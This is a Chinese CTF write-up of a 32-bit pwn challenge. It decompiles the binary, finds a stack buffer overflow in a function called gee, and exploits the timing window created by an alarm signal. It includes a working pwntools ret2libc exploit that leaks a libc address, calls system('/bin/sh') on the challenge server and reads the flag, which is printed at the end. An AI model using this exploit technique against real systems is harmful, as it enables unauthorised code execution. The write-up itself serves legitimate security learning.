# HMI流水灯运行

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=ec0b1b86-24bc-44ed-8f9f-b232027b610f_2)

这题有点恶心，不过只有一点。

-   Arch:     i386-32-little
    <br>RELRO:    Partial RELRO
    <br>Stack:    No canary found
    <Br>NX:       NX enabled
    <Br>PIE:      No PIE (0x8048000)

比较舒服的配置。尝试运行一下，真就流水灯，也不见停止。没兴趣看下去了，直接上ghidra。

```python
void main(void)

{
  EVP_PKEY_CTX *in_stack_ffffff80;
  undefined4 local_71;
  undefined4 local_6d;
  undefined4 local_69;
  undefined4 local_65;
  undefined4 local_61;
  undefined4 local_5d;
  undefined4 local_59;
  undefined4 local_55;
  undefined4 local_51;
  undefined4 local_4d;
  undefined4 local_49;
  undefined4 local_45;
  undefined4 local_41;
  undefined4 local_3d;
  undefined4 local_39;
  undefined local_35;
  timeval local_34;
  timeval local_2c;
  int local_24;
  int k;
  int j;
  int i;
  undefined4 local_14;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  init(in_stack_ffffff80);
  puts("Welcome to horse race lamp program");
  sleep(1);
  write(1,"Initialization the program\n",0x1b);
  gettimeofday(&local_2c,(__timezone_ptr_t)0x0);
  sleep(1);
  for (i = 0; i < 3; i = i + 1) {
    local_14 = 100;
    for (j = 0; j < 60; j = j + 1) {
      local_71 = 0x2e2e2e2e;
      local_6d = 0x2e2e2e2e;
      local_69 = 0x2e2e2e2e;
      local_65 = 0x2e2e2e2e;
      local_61 = 0x2e2e2e2e;
      local_5d = 0x2e2e2e2e;
      local_59 = 0x2e2e2e2e;
      local_55 = 0x2e2e2e2e;
      local_51 = 0x2e2e2e2e;
      local_4d = 0x2e2e2e2e;
      local_49 = 0x2e2e2e2e;
      local_45 = 0x2e2e2e2e;
      local_41 = 0x2e2e2e2e;
      local_3d = 0x2e2e2e2e;
      local_39 = 0x2e2e2e2e;
      local_35 = 0;
      *(undefined *)((int)&local_71 + j) = 0x2a;
      puts((char *)&local_71);
      sleep_ms(local_14);
      printf("\x1b[1A");
      printf("\x1b[K");
    }
    for (k = 58; 0 < k; k = k + -1) {
      local_71 = 0x2e2e2e2e;
      local_6d = 0x2e2e2e2e;
      local_69 = 0x2e2e2e2e;
      local_65 = 0x2e2e2e2e;
      local_61 = 0x2e2e2e2e;
      local_5d = 0x2e2e2e2e;
      local_59 = 0x2e2e2e2e;
      local_55 = 0x2e2e2e2e;
      local_51 = 0x2e2e2e2e;
      local_4d = 0x2e2e2e2e;
      local_49 = 0x2e2e2e2e;
      local_45 = 0x2e2e2e2e;
      local_41 = 0x2e2e2e2e;
      local_3d = 0x2e2e2e2e;
      local_39 = 0x2e2e2e2e;
      local_35 = 0;
      *(undefined *)((int)&local_71 + k) = 0x2a;
      puts((char *)&local_71);
      sleep_ms(local_14);
      printf("\x1b[1A");
      printf("\x1b[K");
      if ((i == 2) && (k == 2)) {
        signal(0xe,handler);
        alarm(2);
      }
    }
  }
  gettimeofday(&local_34,(__timezone_ptr_t)0x0);
  local_24 = ((local_34.tv_sec - local_2c.tv_sec) * 1000000 + local_34.tv_usec) - local_2c.tv_usec;
  puts("\n");
  gee();
  return;
}
```

ghidra反编译复杂字符串就是这个结果，不知道ida是不是。看不出来什么东西，猜测是流水灯的实现。在最后发现了gee函数。

```c
void gee(void)

{
  undefined local_8c [136];
  
  read(0,local_8c,256);
  return;
}
```

太明显的栈溢出了。现在的目标就是看看gee什么时候调用。外层的for循环的i变量用来控制流水灯的行数，j往右走，k往左走。i只有3，从目前得到的信息推测，流水灯应该只会运行3行。实际运行结果是第四行无限跑。注意这个if语句，

```c
if ((i == 2) && (k == 2)) {
    signal(0xe,handler);
    alarm(2);
}
```

当i==2，k==2时，调用[signal](https://www.runoob.com/cprogramming/c-function-signal.html)函数设置handler函数处理0xe号信号。0xe正好是处理alarm的，因此在这行语句的两秒后，程序会进入handler。handler我看过了，跟main中的流水灯部分完全一样的实现，但是是无限循环。在进入handler函数前，我们会先进入gee函数，意味着我们有两秒的时间泄露libc地址并且getshell。

相信pwntools的速度。

```python
from pwn import *
r = remote("61.147.171.105",49242) 
r.recvuntil("\n\n")
writeplt = 0x08048510
writegot = 0x0804a030
readgot = 0x0804a00c
gee = 0x08048888
 
payload1 = b"A" * 140 + p32(writeplt) + p32(gee) + p32(1) + p32(readgot) + p32(4)
r.sendline(payload1)
a=u32(r.recv(4))

libc_base = a - 869200
system_address = libc_base+239936
binsh_address = libc_base+0x0015902b 
 
r.sendline(b"A"*140 + p32(system_address)+ b"BBBB"+ p32(binsh_address))
r.sendline("cat flag")
print(r.recvuntil("}\n"))
r.close()
```

我本来想直接r.interactive()的，但是发现cat出来的flag被吃了，看不到输出。所以我们要眼疾手快，用pwntools接收到flag后就关上。

- ### Flag
  > cyberpeace{5ef5405d20e547203be38d102f171c03}